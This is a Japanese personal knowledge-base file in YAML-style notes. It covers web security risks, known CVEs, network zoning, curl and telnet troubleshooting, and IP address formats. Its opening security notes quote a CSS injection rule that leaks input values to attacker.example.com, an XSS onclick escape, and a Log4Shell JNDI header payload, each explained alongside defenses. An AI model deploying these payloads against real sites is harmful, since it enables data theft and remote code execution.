                    background: url(http://attacker.example.com/?b)
                }
                input[value ^= "c"] {
                ...
            #// 悪意のある人が設置した attacker.example.com サーバーに HTTP リクエストを出すことで文字が伝わってしまいます
            #ref: https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce?slide=11
            #ref: ${typrm_files}/ref/Network-AI.yaml#label: CSS security risk
        イベントハンドラーの print 出力:  #// 未確認
            out.println("<a name=\"#\" onclick= \"alert('" + escape(word) + "')\">");
            <a name="#" onclick= "alert('') any code \')">
            #ref: https://blog.tokumaru.org/2012/04/
        不正プログラム: #keyword: 不正プログラム
            エクスプロイト: #keyword: exploit  エクスプロイト  実証コード
                攻撃手段。不正プログラム。成立条件
                #// 元々は偉業・手柄・功績という意味
            リバース コネクト シェル: #keyword: reverse connect shell,  バックドア
                保護対象: バックドアのインストール
                攻撃内容: #// 未確認
                    機能としては SSH と同じで任意のコマンドを実行します。
                    特定のポートから攻撃者のサーバーをポーリングします(?)。
                    SSH のリクエストはクライアントだが、reverse connect shell のリクエストはサーバー。
                保険的対策: アウトバウンドのポートを最小限にする(?)
                    （Web shell では効果なし）
                    監視はサーバーではなく リバース プロキシ が行うのが良い。
                    リバース プロキシ への侵入はほぼ不可能なため。
                #ref: https://mymanfile.com/?p=1543
        プロンプト インジェクション:
            AI がプラグインから情報を得て漏洩させる
        リポジトリへの攻撃:
            #ref: https://gigazine.net/news/20251125-shai-hulud-1k-npm-packages-27k-github-infected/
    クラウド:
        ZIPアーカイブのスキャンを開始  #ref: https://softantenna.com/blog/microsoft-scan-password-protected-zip-files/
    漏洩, 合鍵:  #// センシティブな情報、重要情報 が対象
        対象: 情報資産。漏洩させないようにする対象。顧客情報 個人情報 決済情報 認証情報 など
            #search: 情報資産
        漏洩原因:
            フォームの GET メソッドによる漏洩:
                GET メソッドは、フォームの項目が URL に含まれて漏洩してしまいます。
        合鍵: #keyword:
            問題: #keyword: 合鍵問題
                説明:
                    個人用の鍵の合鍵を作って（秘密鍵をコピーして）他の人と共有した場合、その鍵で作られた署名は他の人が署名した可能性があります。
                    パスワード付きの秘密鍵であっても、パスワードを共有していたら、同様の可能性があります。
                対象:
                    秘密鍵、パスワード、共有スマホ、ハードウェア トークン
            対処:
                個人認証:
                    秘密鍵を共有するのではなく、共有する人それぞれを認証します
                    #ref: https://qiita.com/gungungggun/items/a927f170bda43bf7b1f6
                価値の高い鍵:  #// 個人認証と両方行います
                    有効な個人のメールアドレスが入っている鍵を使います。（有効期限はデフォルトで存在）
                    もしくは、他の用途でも使っていて、仲間であっても、なりすまされたら困る鍵を使います。
                    たとえば、どこか複数に登録してある鍵。役所やサービスのアカウント。
                ハードウェア:  #// 個人認証と両方行います
                    ハードウェア トークン やスマホ（二要素認証）を使います。
                    ただし、利便性が悪く、他の人に渡すこともできてしまいます。
        マルチ テナント: #keyword:  #// 他の顧客の情報が漏洩してしまう問題
            原因例:
                認証, 認可:
                DB クエリ:
                    - 顧客 ID が無いテーブルや、キャッシュから誤って返してしまう
                    - アクセス権の設定の失敗
                脆弱性ハッキング:
                    システムへのアクセス
    脆弱性: #keyword:  #// vulnerability ヴァルネラビリティ
        CVE: #keyword:  #ref: https://www.cve.org/  #// 世界共通の脆弱性の番号
            関連:
                CVE.report: #ref: https://cve.report/software/minio/minio
        CVSS: #keyword:  #// Common Vulnerability Scoring System
            None (0.0)
            Low (0.1-3.9)
            Medium (4.0-6.9)
            High (7.0-8.9)
            Critical (9.0-10.0)
        検査対象:  #// OS, ミドルウェア など
            OS, フレームワーク, ミドルウェア, 外部から提供されたアプリケーション
        ソーシャル エンジニアリング:
        回避策, ワークアラウンド:  #// 応急処置
            非公開の安全性:  #keyword: not published Web API safety
                #ref: ${typrm_files}/ref/Network-AI.yaml#label: not published Web API safety
                内部の脅威:
                ネットワークのセキュリティ:
                アクセス管理:
                アプリケーションの脆弱性:
        言語別バージョン確認方法: #keyword: 脆弱性調査
            Python:
                poetry.lock ファイルを全文検索:
                    パッケージ名のサンプル:
                        - cryptography
                        - Django
            Go 言語:
                対象の Repository 名 を調べます:
                    Repository 名 のサンプル:  #// import に指定する名前
                        - go.uber.org/zap
                        - codeberg.org/mellium/sasl  #ref: https://pkg.go.dev/mellium.im/sasl
                全文検索します:  #// 全文検索すると ____.go や go.sum も検索対象になります
                    詳細:
                        Go 言語 の import から（全文検索）:
                            Repository 名 の検索:  #ref: https://pkg.go.dev/
                        go.sum から検索:
                            調査対象のファイルを一覧します:
                                find . | grep "\(go.mod\|go.sum\)"
                            go.sum の中を Repository 名 で検索します:
                Go 言語のバージョンを調べます:
                    #search: Go version in executable binary file
            サービス, パッケージ:
                バージョン番号: rpm -qa
                サービスの稼働状態:  #// プリインストールされていても Active になっていなければ使っていません
                    systemctl status
                        または
                    ps aux | grep __PartOfPackageOrOthers__
                ポートが開いているか:  #// 通常、サービスを Active にすると同時に開く
                    ss -anp | grep :__PortNum__
        個別の脆弱性:
            XZ Utils CVE-2024-3094:
                対象バージョン: 5.6.0, 5.6.1
                発見時の推奨: 5.4.6 などへダウングレード
                バージョン確認方法:  #ref: https://piyolog.hatenadiary.jp/entry/2024/04/01/035321
                    (bash): for xz_p in $(type -a xz | awk '{print $NF}' | uniq); do strings "$xz_p" | grep "xz (XZ Utils)" || echo "No match found for $xz_p"; done
                        z (XZ Utils) 5.2.2
            Spring4Shell: #keyword:  #// 2022年 Java の Spring Framework の脆弱性を突いた攻撃
                関連: #search: CVE-2022-22963
                公式:
                    脆弱性: #ref: https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/
                    VMware: #ref: https://tanzu.vmware.com/security/cve-2022-22963
                対象:
                    JDK, Spring Core:
                        9以降
                        import org.springframework.core.Ordered;
            CVE-2022-22963: #keyword:
                Spring Cloud Function:
                    3.1.6, 3.2.2, およびそれ以前
                    3.1.7, 3.2.3 は対策済み
                攻撃内容:
                    ルーティング機能を使用する場合、ユーザーは特別に細工された SpEL をルーティング式として提供して、
                    ローカルリソースにアクセスする可能性があります。
            Log4Shell: #keyword:  #// 2021年 log4j の脆弱性を突いた攻撃
                攻撃方法:
                    攻撃者のPC:
                        攻撃者は、ログに記録される可能性のあるヘッダーフィールドにJNDIルックアップを挿入します:
                            ヘッダー:
                                User-Agent: ${jndi:ldap://eil.xa/x}
                            防御: WAF
                    脆弱なサーバー:
                        悪意のある文字列はログ記録のためにlog4jに渡されます:
                            防御: log4j を無効にします
                        脆弱性のあるバージョンのlog4jがログを処理します:
                            防御: log4j を最新版に更新します
                        log4jは文字列を補間し、悪意のあるLDAPサーバーにクエリを実行します:
                            防御: JNDI look up を無効にします
                    悪意のある LDAP サーバー:
                        LDAPサーバーは、悪意のあるJavaクラスを含むディレクトリ情報で応答します:
                            防御: （不明）
                    脆弱なサーバー(2):
                        JAVAは悪意のあるJavaクラスを逆シリアル化し、実行します:
                            防御: リモート実行を禁止します
                参考:
                    #search: log4j
                    #ref: https://www.nginx.co.jp/blog/mitigating-the-log4j-vulnerability-cve-2021-44228-with-nginx/
            RCE脆弱性: #keyword:  #// remote code execution
            log4j: #keyword:  #// ログ ライブラリ の脆弱性
                攻撃: #search: Log4Shell
                    対策済みバージョン: log4j 2.16以降, log4j 1.x はこの脆弱性は無い
                        ただし、Log4j 1.xはすでに開発およびサポートが終了しているため、後継製品への移行を強く推奨します。
                状況:
                    nginx: #search: nginx log4j
                参考:
                    JPCERT/CC: #ref: https://jvn.jp/vu/JVNVU96768815/
                    IPA: #ref: https://www.ipa.go.jp/security/ciadr/vul/alert20211213.html
            Django: #keyword: Django 脆弱性
                検索: #ref: https://www.google.com/search?q=django+脆弱性
                セキュリティ アップデート をしていないバージョン:
                    バージョン 3 系以下 in 2022-06-21
                    #ref: https://www.djangoproject.com/download/ >> Unsupported previous releases
                SQL インジェクション:
                    3.1.0 .. 3.1.12,  3.2.0 .. 3.2.4  #ref: https://jvndb.jvn.jp/ja/contents/2021/JVNDB-2021-008920.html
                パストラバーサル:
                    2.2.0 .. 2.2.17,  3.0.0 .. 3.0.11,  3.1.0 .. 3.1.5  #ref: https://jvndb.jvn.jp/ja/contents/2021/JVNDB-2021-003141.html
        レッド チーミング: #keyword: Red Teaming
            概要: 社内の独立した脆弱性検証チーム
            活動: 不正侵入の試み, 脆弱性評価
            自動化: BAS(Breach&Attack Simulation)や自動侵害ソリューション（Automated Pentesting tool）など
            #ref: https://www2.deloitte.com/jp/ja/blog/cyber/2023/the-past-and-future-of-red-teaming.html
        関連 >> SBOM:  #search: SBOM
    ネットワーク分離: #keyword: ネットワーク分離, network segmentation, ネットワーク ゾーニング
        図: |
            [インターネット]
                    │
                [Firewall]
                    │
            ┌──────┐
            │    DMZ     │ ← 公開Webサーバ、APIゲートウェイ
            └──────┘
                    │（限定通信）
            ┌──────┐
            │ App Zone   │ ← アプリケーションサーバ
            └──────┘
                    │（限定通信）
            ┌──────┐
            │Secure Zone │ ← DB、Vault、Secret格納ホスト
            └──────┘
        表: |
            | ゾーン                            | 例                                      | 保護対象                | 通信制御                               |
            |-----------------------------------|-----------------------------------------|-------------------------|----------------------------------------|
            | **パブリックゾーン**              | Webサーバ、APIゲートウェイ              | 公開サービス            | 外部→内部の通信を最小限に制限         |
            | **DMZ（非武装地帯）**             | リバースプロキシ、ロードバランサ        | 外部公開と内部の緩衝    | 内外間の通信監査・フィルタリング       |
            | **アプリケーションゾーン**        | APIサーバ、アプリケーションサーバ       | 業務ロジック            | DMZ からのみ通信を許可                 |
            | **データゾーン / セキュアゾーン** | データベース、Vault、Secret管理システム | シークレットや個人情報  | アプリ層からのみ通信を許可             |
            | **管理ゾーン**                    | 管理サーバ、監視サーバ、CI/CD基盤       | 管理者専用の管理機能    | 原則外部アクセス禁止（VPN/Bastion経由）|
        各ゾーンの説明:
            内部ネットワーク, プライベートゾーン: データベース、機密情報、内部システムなど
            DMZ, 非武装地帯: DeMilitarized Zone, Webサーバー、メールサーバーなど外部からアクセスされる公開システム
            外部ネットワーク, パブリックゾーン: インターネット、オフィス ネットワーク
        対策:
            Secret Zero 問題: #search:
            ファイアウォール: iptables
    被害の範囲: #keyword:
        任意のコード実行:
            影響範囲を理論的には特定できないので、状況証拠（ログ）からの推測しかできない。
            対策としては、サーバーの再構築
        漏洩したデータの特定:
            ダウンロードはログに残るが、シェルではその本体には残らない
        侵害意図の判断:
            知りたがるため(?)
    被害発生後の対処:
        サーバーの再構築。
        不審ファイルの削除だけでは不十分。
    ISO/IEC 27017:  #// クラウドセキュリティ認証
    ISMAP: #keyword:  #// 政府情報システムのためのセキュリティ評価制度
        #ref: https://www.ismap.go.jp/csm
ネットワークの負荷: #keyword: network load
    調べる, モニタリング:
        NIC の負荷:
        経路の負荷:
            ツール: PRTG Network Monitor, SolarWinds
            SNMP プロトコル:
                ネットワークデバイス（ルーター、スイッチなど）からパフォーマンスデータを収集し、
                ネットワークの利用率を監視します
            NetFlow/SFlowアナライザー:
ブロック チェーン: #keyword:
    NFT: #keyword:  #// Non Fungible Token
        概要:
            所有者台帳: ブロック チェーン の大元が固有（本物）。所有者だけが譲渡できる。
                コンテンツは ブロック チェーン には含まれない。実験はある。
                ただし、法律による所有権修正手続きがあれば、法律が優先され、BAN される。
            必要性: 希少なコンテンツでなければ、NFTでなくても既存のフラグで十分なことが多い。流行りとしての価値もある
            コピー ガード: 対象物のコピーガードはできない。応用として特権コンテンツへのアクセス権を制御できそう
            追跡機能: クリエイターへの利益還元。決済システムと連携すればできる
            所有者の価値: 本物マウント。初期の会員番号
            詐欺: 偽 NFT, 騙し譲渡
        関連:
            円と仮想通貨の交換: 金融庁のライセンスが必要。KYCによる本人確認が必要
        山田太郎: #ref: https://www.youtube.com/watch?v=PfTCNVuknXk
        中田敦彦: #ref: https://www.youtube.com/watch?v=4WaOfTkOh3U
書籍:
    体験しながら学ぶネットワーク技術入門:  #// No. は Kindle の位置番号  #search: Kindle 位置番号
        レイヤーの図: 写真 2024-01-14
        tinet のインストール: No.27
        メモ:
            無線LANにポートは無いか？
            無線LANはL3とL2です。
            L3のソフトウェアはL2のAPIで制御します。IPアドレスでクライアントを識別します。
            L2のソフトウェアはMACアドレスで識別します。
トラブルシューティング（ネットワーク）:  #keyword: network trouble shooting
    #↓ デバッグ
    ブラウザーのログを記録します: #keyword: browser network log
        （必要なら）Chrome のシークレット モード（Edge の In Private ブラウズ）を開きます:
        問題が発生するページを表示します:
        ネットワークとコンソールのログの記録します:
            ページを移動してもログがクリアされないようにします:
                ネットワーク ログ:
                    Edge >> ネットワーク タブ >> ログの保持
                コンソール ログ:
                    Edge >> コンソール タブ >> 歯車アイコン（右上）>> ログの保持
            ログをクリアします:
                ネットワーク ログ:
                    Edge >> ネットワーク タブ >>
                        ◉ ネットワーク ログ の記録 ボタン（開発者ビューの左上：クリックして黒いボタンにします）>>
                        ∅ クリア ボタン（ネットワーク ログ の記録ボタンのすぐ右）
                コンソール ログ:
                    Edge >> コンソール タブ >>
                        ∅ クリア ボタン（左上）
            ログの記録を開始します:
                ネットワーク ログ:
                    Edge >> ネットワーク タブ >>
                        ◉ ネットワーク ログ の記録 ボタン（開発者ビューの左上：クリックして赤いボタンにします）
                コンソール ログ:
                    （操作不要）
            問題を発生させます:
            ログの記録を終了して保存します:
                ネットワーク ログ:
                    - Edge >> ネットワーク タブ >> ◉ ネットワーク ログ の記録 ボタン（黒いボタンにします）
                    - （ログが表示されているテーブルを右クリック）>> コンテンツを含むすべてを HAR として保存する
                    - （メモ帳などで内容を確認します）
                コンソール ログ:
                    - （ログが表示されている部分を右クリック）>> 名前を付けて保存
            設定を戻します:
                ネットワーク ログ:
                    - Edge >> ネットワーク タブ >> ログの保持
                    - Edge >> ネットワーク タブ >> ◉ ネットワーク ログ の記録 ボタン
                コンソール ログ:
                    - Edge >> コンソール タブ >> 歯車アイコン（右上）>> ログの保持
            参考:
                トラブルシューティングのために ブラウザー トレース をキャプチャする
                https://docs.microsoft.com/ja-jp/azure/azure-portal/capture-browser-trace
                の「4. F12 キーを押す」から
        保存したログファイルをご返送ください:
            必要なら暗号化するか、安全な ストレージ サイト を経由します
    #↓ エラー メッセージ
    Connection refused:  #keyword: Connection refused
        タイムアウトする場合:
            proxy: #search: curl Connection refused
            ACL (cURL): #search: ACL 疎通確認 (cURL)
            sysmted: /etc/systemd/system/management.slice
        すぐエラーになる場合:
            ssh:  #search: port 22 Connection refused
            telnet:  #search: telnet Connection refused
            sshd_config:  #search: /etc/ssh/sshd_config
        （エラーになるタイミングは未確認）:
            Java: #search: Java Connection refused
            nginx: #search: nginx Connection refused
            ElasticSearch: #search: ElasticSearch Connection refused
            Docker: #search: Docker Connection refused
    curl >> (111) Connection refused:  #keyword: curl Connection refused
        操作: curl http://localhost:10080/
        エラー: |
            The requested URL could not be retrieved
            (111) Connection refused
        対処:
            LAN がプロキシを使っている場合:
                プロキシを使わないようにします: #keyword: curl --noproxy
                    curl --noproxy "*" http://localhost:10080/
            その他の対策:  #search: Connection refused
    curl:;; (5) Could not resolve proxy:;; __ProxyHost__:  #keyword: curl: (5) Could not resolve proxy:
        手順: curl
        ログ: |  #keyword: curl: (5) Could not resolve proxy:
            $ curl -v  google.com
                curl: (5) Could not resolve proxy: __ProxyURL__
            $ nslookup  google.com
                ;; connection timed out; no servers could be reached
        原因:
            リモート デスクトップ に再ログインしたときに DNS が変わるため？
        対処A:
            WSL2 または Windows を再起動します
        対処B:
            /etc/resolv.conf の内容を、既存の内容と比較します
    curl:;; (6) Could not resolve host:;; __HostName__:  #keyword: curl: (6) Could not resolve host:
        手順: curl
        エラー: |  #keyword: curl: (6) Could not resolve host:
            curl: (6) Could not resolve host: __HostName__
        原因:
            ホスト名を DNS に問い合わせても解決できませんでした
        対処A:
            Docker コンテナーで実行したときのエラーの場合:
                #search: docker DNS trouble
    curl:;; (7) Failed to connect to __Server__ port __Port__:;; Connection refused:
        手順: curl
        エラー: |  #keyword: curl: (7) Failed to connect to
            curl: (7) Failed to connect to __Server__ port __Port__: Connection refused
        状況:
            - サーバーまでは到達しているが、接続を受け付けてもらえませんでした
        原因:
            - サービスが起動していない
            - 間違ったポート番号
            - ファイアウォールでブロック
            - サーバーが特定のインターフェースのみリッスン
        対処:  #// 原因を特定します
            サービスが起動しているか確認します:
                (@サーバー側)
                sudo ss -tlnp | grep __Port__
                #search: Linux ss
            ファイアウォールの設定を確認します:
                #search: iptables or nftables
            ポートスキャンします:  #// 未確認
                nmap -p __Port__ __Server__
    curl:;; (56) Received HTTP code 403 from proxy after CONNECT:
        手順: curl
        エラー: |  #keyword: curl: (56) Received HTTP code 403 from proxy after CONNECT
            curl: (56) Received HTTP code 403 from proxy after CONNECT
        対処:
            no_proxy を設定してください
        原因:
            HTTPS 接続 をプロキシ経由で張ろうとしたときに、プロキシが CONNECT 要求を拒否しました。
    telnet:;; connect to address 192.168.0.82:;; Connection refused:  #keyword: telnet Connection refused
        操作: |
            telnet server 22
            Trying 192.168.0.82...
            telnet: connect to address 192.168.0.82: Connection refused
        エラー:
            （上記）
            すぐにエラーになる
        対処:
            #search: port 22 Connection refused
        関連:  #search; port 22 No route to host
    telnet:;; connect to address 202.100.100.2:;; No route to host:  #keyword: port 22 No route to host
        エラー: |
            $ telnet intra-gitlab.com
            Trying 202.100.100.2...
            telnet: connect to address 202.100.100.2: No route to host
        状況:
            nslookup は成功する: |
                $ nslookup intra-gitlab.com
                Address: 202.100.100.2
        対処A:
            プロキシを設定します  #search: https_proxy
        対処B:
            intra-gitlab.com にアクセスしているので、認証を設定した git clone では成功するかもしれません。
            同じホストかつ同じポートなので、No route to host というエラーメッセージは適切ではないかもしれません。
    ping:;; icmp_seq=1 Destination Host Unreachable:
        手順: ping intra-gitlab.com
        エラー: |
            PING intra-gitlab.com (202.100.100.2) 56(84) bytes of data.
            From 202.100.100.44 (202.100.100.44) icmp_seq=1 Destination Host Unreachable
        状況:
            nslookup は成功する: |
                $ nslookup intra-gitlab.com
                Address: 202.100.100.2
        対処:
            intra-gitlab.com にアクセスしているので、認証を設定した git clone では成功するかもしれません。
            同じホストかつ同じポートなので、Destination Host Unreachable というエラーメッセージは適切ではないかもしれません。
    サーバーのサービス（ポート）に到達しないか拒否される:  #keyword: Docker Connection refused
        手順: curl  http://172.17.0.2:8500  または ブラウザーに http://192.168.33.51:8500 と入力したとき
        エラー: |
            Failed to connect to 172.17.0.2 port 8500: Connection refused
        対処:
            VirtualBox in Windows -- Docker for Linux -- コンテナー という環境で、サービスがコンテナーにある場合:
                コンテナーでサービスが動いていることを確認します:
                    原因を絞り込みます:
                        コンテナーにログインします:  #search: Docker container login bash
                            - docker run ___ bash  #search: docker run
                            - または
                            - docker exec ___ bash  #search: docker exec
                        ポートの状態を表示します:
                            - (@container)  netstat -ln  #search: Linux netstat
                                #// 対象のポート番号があることを確認します
                                #// 無ければサービスが正しく起動できていません
                        アクセスします:
                            curl でアクセスする場合:
                                - (@container)  curl  http://localhost:__PortNum__  #// __PortNum__ の例：8500
                            #// アクセスできるときは、この章の対象ではありません
                    サービスが使うポート番号に関するオプションを正しく設定します:
                リクエスト元の IP アドレス フィルター をチェックします:
                    原因を絞り込みます:
                        コンテナーにログインして原因を絞り込む場合:
                            コンテナーにログインします:  #search: Docker container login bash
                                - docker run ___ bash  #search: docker run
                                - または
                                - docker exec ___ bash  #search: docker exec
                            localhost 以外でアクセスできるか確認します:
                                curl でアクセスする場合:
                                    - (@container)  curl  http://__IP_Address__:__PortNum__
                                        #// __IP_Address__ の例: 172.17.0.2  #search: docker network deafult IP address
                                        #// __PortNum__ の例：8500
                                #// localhost にも __IP_Address__ にもアクセスできるときは、この章の対象ではありません
                        コンテナーのホストOSで原因を絞り込む場合:  #// ホストOS は、Docker for Linux なら VirtualBox の VM など
                            curl でアクセスする場合:
                                プロキシが無い LAN にいる場合:
                                    - (@Linux)  curl  http://__IP_Address__:__PortNum__ （__IP_Address__ 等は上記を参照）
                                プロキシが有る LAN にいる場合:
                                    - (@Linux)  curl  http://__IP_Address__:__PortNum__  --noproxy "__IP_Address__" （__IP_Address__ 等は上記を参照）
                            #// アクセスできるときは、この章の対象ではありません
                    IP アドレス フィルター に関するサービス固有の設定を確認します:
                        Consul の場合:  #search: Consul agent client option
                Docker の ポートフォワーディング オプション をチェックします:
                    原因を絞り込みます:
                        Docker のホストOS(Linux)で原因を絞り込む場合:
                            curl でアクセスする場合:
                                - (@Linux)  curl  http://localhost:__PortNum__
                                    #// curl: (7) Failed connect to localhost:8500; Connection refused
                                    #// と表示されたら以下へ
                        VM のホストOS(Windows)で原因を絞り込む場合:
                            ブラウザーでアクセスする場合:
                                - (@Windows)  http://__VM_IP_Address__:__PortNum__
                                    #// __VM_IP_Address__ の例: 192.168.33.51  #search: Vagrant config.vm.define
                                    #// 拒否されるときは以下へ
                    Docker の ポートフォワーディング オプション を設定します:  #search: docker port forwarding
            その他の対策:  #search: Connection refused
    同じ LAN 内のサーバーにアクセスしようとして、プロキシーサーバーが応答してしまう:  #keyword: LAN access proxy server squid responds
        手順: http://localhost
        エラー: <p>Generated __DateTime__ by __ProxyServer__ (squid)</p>
        対処: no_proxy 環境変数を設定します
    Wi-Fi に接続できない:  #keyword: Windows Wi-Fi password reset
        操作: Windows 10 21H1, 1909 >>（通知領域のネットワーク アイコン）>>（SSID＝Wi-Fi のアクセスポイント名）>>
            接続 ボタン
        エラー:
            接続できません、と表示され、新しいパスワードを入力できない
        対処:
            パスワードをリセットすると再入力できるようになります:
                Windows 11: 設定 >> ネットワークとインターネット（左）>> Wi-Fi（上）>> 既知のネットワークの管理（中央上）>>
                     （無線LANの名前）>> 削除
                Windows 10 21H1, 1909: 設定 >> ネットワークとインターネット >> Wi-Fi（左）>> 既知のネットワークの管理（中央上）>>
                    （無線LANの名前）>> 削除
    #↓ 参考
    初心者でもよくわかる！VPSによるWebサーバー運用講座:  https://knowledge.sakura.ad.jp/3424/
用語:  #glossary:
    Active Directory:  #// Windows の ディレクトリ サービス
        社内でログインするときは多くの場合、Active Directory が承認します。
        LDAP をサポートしていますが他もサポートしています。
    ARP リクエスト: #// あて先MACアドレスが分からない場合、送信元はIPアドレスのMACアドレスを問い合わせるARPリクエストを LAN 内（VLAN内）のブロードキャストで送信する
    AzureAD: Entra ID の旧版  #search: Microsoft Entra ID
    broadcast: #keyword:
        _: （同一ブロードキャストドメイン内の）全ポート (入力インタフェースを除く) から Ethernet フレームを送信すること
        broadcast: L2 ブロードキャストアドレス (FF:FF:FF:FF:FF:FF) にリクエストが来たとき、すべての（ハブの）ポートから送信します
        multicast: すべての（ハブの）ポートから送信しますが、マルチキャスト MAC アドレスに参加している端末だけ応答します
        flooding: MAC アドレステーブルに MAC アドレスを入れるために、すべての（ハブの）ポートから送信します
        #ref: https://milestone-of-se.nesuke.com/nw-basic/ethernet/flooding-and-broadcast/
    DNS: #search:  #// Domain Name Service
    Entra ID: #keyword: Microsoft Entra ID  #ref: https://learn.microsoft.com/ja-jp/entra/fundamentals/whatis
        クラウドとオンプレミス全体のすべてのアプリに対する ID のサービス
    flooding: #keyword:
        #search: broadcast
    FQDN: #keyword: FQDN,  www.(sub.)example.com  Fully Qualified Domain Name：完全修飾ドメイン名  インターネット ホスト名  #ref: ${programming}/HTML ブラウザ/URL.svg#url
        参考: #search: FQDN in URL
        バリデーション:
            Python: | #ref: https://stackoverflow.com/questions/2532053/validate-a-hostname-string
                def is_valid_fqdn(fqdn):
                    pattern = r'^(?=.{1,253}$)(([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)*[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)\.?$'
                    return re.match(pattern, fqdn) is not None
    ISMS: #// Information Security Management System
    IPアドレス: #keyword: IP address  #ref: ${programming}/ネットワーク・セキュリティ/IPアドレスの設定.svg#ipadr
        IPv4: #keyword:  #// Internet Protocol version 4  #// 例 192.168.0.11
            パース, 書式チェック:  #search: check IP address format
        IPv6: #keyword:  #// 例 2001:db8:85a3::8a2e:370:7334
            書式:
                基本形:  #// グループ（4桁の16進数）が 8個。あまり使われません
                    書式:     0000:0000:0000:0000:0000:0000:0000:0000
                    サンプル: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
                短縮形:  #// 上位の 0 と連続する 0（1回）
                    ルール:
                        - グループの上位の 0 は省略可能
                        - 連続するゼロのグループは「::」に置き換え可能。ただし1回のみ
                    サンプル: 2001:db8:85a3::8a2e:370:7334   #// ← 2001:0db8:85a3:0000:0000:8a2e:0370:7334
                正規化, 推奨テキスト表記:  #// RFC5952 による IPv6 の正規化
                    ルール:  #ref: https://www.nic.ad.jp/ja/newsletter/No46/0800.html
                        #↓短縮形であること
                        - グループの上位の 0 は省略
                        - 連続する 0000 のグループは「::」に置き換え
                        #↓その他
                        - グループが 0000 でも、前後のグループが 0000 以外（単独の 0000）の場合、「::」に置き換えない
                        - 最も多く連続する 0000 を「::」に置き換え。連続数が同じときは左側を「::」に置き換え
                        - a-f は小文字
                    #// プログラミング言語におけるライブラリ関数の大半のバージョンでは、上記の推奨表記で出力する実装が行われています
                CIDR:  #// IPv6 アドレス / プレフィックス長
                    2001:db8::/128
                最大文字数:
                    IPv6 アドレス: 最大 39文字
                    CIDR: 最大 43文字
            構造:
                IPv6 のアドレス構造と割り当て方法:  #ref: ${typrm_files}/ref/Network/IPv6_address_1.html
                IPv6アドレスの型, ループバック, マルチキャスト, グローバルユニキャスト:  #ref: ${typrm_files}/ref/Network/IPv6_address_2.html
            パース, 書式チェック: #keyword: check IP address format
                #// プログラミング言語におけるライブラリ関数の大半のバージョンでは、上記の推奨表記で出力する実装が行われています  #ref: https://www.nic.ad.jp/ja/newsletter/No46/0800.html
                Go 言語 net.ParseIP: #keyword:
                    IPv6 または IPv4 の判定:
                        func isValidIPv6OrIPv4(ip string) bool {
                            return (net.ParseIP(ip) != nil)
                    IPv6 の判定:  #// 未確認  #// IPv4 ではないことの判定
                        func isValidIPv6(ip string) bool {
                            parsedIP := net.ParseIP(ip)
                            return parsedIP != nil && parsedIP.To4() == nil
                C言語, PHP: inet_ntop  #// IPv4/IPv6 アドレスをバイナリ形式からテキスト形式に変換する
                WIN32API: WSAAddressToString
                正規表現:  #// いろいろな説がある。下記は一例
                    1: |  #// ChatGPT の回答
                        ^(([0-9a-fA-F]{1,4}:){7}([0-9a-fA-F]{1,4}|:))|(([0-9a-fA-F]{1,4}:){1,7}:)|(([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4})|(([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2})|(([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3})|(([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4})|(([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5})|([0-9a-fA-F]{1,4}:)((:[0-9a-fA-F]{1,4}){1,6})|(::([0-9a-fA-F]{1,4}:){1,7}|::)|(([0-9a-fA-F]{1,4}:){1,7}:)$
                    2: |  #// Claude の回答
                        ^(?:
                        (?:[A-Fa-f0-9]{1,4}:){7}[A-Fa-f0-9]{1,4}|
                        (?:[A-Fa-f0-9]{1,4}:){1,7}:|
                        (?:[A-Fa-f0-9]{1,4}:){1,6}:[A-Fa-f0-9]{1,4}|
                        (?:[A-Fa-f0-9]{1,4}:){1,5}(?::[A-Fa-f0-9]{1,4}){1,2}|
                        (?:[A-Fa-f0-9]{1,4}:){1,4}(?::[A-Fa-f0-9]{1,4}){1,3}|
                        (?:[A-Fa-f0-9]{1,4}:){1,3}(?::[A-Fa-f0-9]{1,4}){1,4}|
                        (?:[A-Fa-f0-9]{1,4}:){1,2}(?::[A-Fa-f0-9]{1,4}){1,5}|
                        [A-Fa-f0-9]{1,4}:(?:(?::[A-Fa-f0-9]{1,4}){1,6})|
                        :(?:(?::[A-Fa-f0-9]{1,4}){1,7}|:)|
                        fe80:(?::[A-Fa-f0-9]{0,4}){0,4}%[0-9a-zA-Z]{1,}|
                        ::(?:ffff(?::0{1,4}){0,1}:){0,1}(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])|
                        (?:[A-Fa-f0-9]{1,4}:){1,4}:(?:(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(?:25[0-5]|(?:2[0-4]|1{0,1}[0-9]){0,1}[0-9])
                        )$
            仕様の歴史:
                RFC1884 → RFC2373 → RFC3513 → RFC4291 → RFC5952
            Windows の設定:  #search: Windows IPv6
        オクテット: 8ビット。IP アドレスの中のピリオドで区切られるそれぞれの数字。 192.168.0.11 なら 192, 168, 0, 11
        インターフェースID: #// 例 192.168.0.11%2 ... 2番目のインターフェース
        プライベート アドレス: #search: IP private address
        正規表現: #keyword: IP address regular expression,  IP address grep
            パターン: ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$
            実行例:
                -   echo "192.168.0.121"  |  grep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$';  echo $?
                -   if echo "${sshConfig}"  |  grep -E '^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$' > /dev/null; then
        WHOIS: #keyword:  #// IP アドレス の所有者情報  #ref: https://www.cman.jp/network/support/ip.html
        mac: #keyword: mac IP アドレス
            りんご >> システム設定 >> ネットワーク >> Wi-Fi（など）>>（ルーター名）詳細 >> TCP/IP >> IP アドレス
            #search: mac MAC アドレス
